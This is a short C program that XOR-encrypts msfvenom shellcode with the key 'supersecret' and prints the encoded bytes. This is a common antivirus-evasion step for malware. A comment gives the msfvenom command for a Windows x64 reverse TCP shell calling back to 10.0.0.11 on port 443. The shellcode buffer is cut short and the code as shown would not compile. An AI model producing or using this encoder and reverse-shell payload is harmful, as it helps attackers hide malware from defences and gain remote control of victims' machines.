#include <windows.h>
#include <stdio.h>


int main () 
{
    char key[] = "supersecret";

	// msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.11 LPORT=443 -f c
    unsigned char buf[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52..."

    int j = 0;
    for (int i = 0; i < sizeof buf; i++) 
    {
        if (j == sizeof key - 1) j = 0;

        buf[i] = buf[i] ^ key[j];
        j++;
    }

    for (int i = 0; i < sizeof buf; i++)
    {
        printf("\\x%x", (unsigned char)buf[i]);
    }

}
